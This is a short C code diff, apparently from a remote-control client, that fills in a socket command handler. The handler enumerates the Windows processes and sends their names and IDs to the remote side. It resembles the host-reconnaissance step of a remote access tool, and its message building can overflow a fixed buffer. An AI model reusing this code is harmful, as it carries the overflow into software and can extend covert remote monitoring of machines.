@@ -144,7 +144,38 @@ int cmdInform(SOCKET sock) {
 }
 
 int cmdProc(SOCKET sock) {
-    printf("Executing proc\n");
+    DWORD processes[DEFAULT_BUFLEN];
+    DWORD cbNeeded;
+
+    char msg[DEFAULT_BUFLEN];
+    memset(msg, 0, DEFAULT_BUFLEN);
+
+    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
+        DWORD numProcesses = cbNeeded / sizeof(DWORD);
+        for (DWORD i = 0; i < numProcesses; i++) {
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
+            if (hProcess != NULL) {
+                TCHAR processName[MAX_PATH] = TEXT("<unknown>");
+                char p[DEFAULT_BUFLEN];
+                memset(p, 0, DEFAULT_BUFLEN);
+                HMODULE hMod;
+                if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ) {
+                    if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
+                        printf("Process ID: %d, Process Name: %s\n", processes[i], processName);
+                        sprintf(p, "Process ID: %d, Process Name: %s\n", processes[i], processName);
+
+                        const char* cc = (const char*)p;
+
+                        strncat(msg, cc, strlen(cc));
+                    }
+                    CloseHandle(hProcess);
+                }   
+            }
+        }
+        sendMsg(sock, msg);
+    } else {
+        return -1;
+    }
     return 0;
 }
 
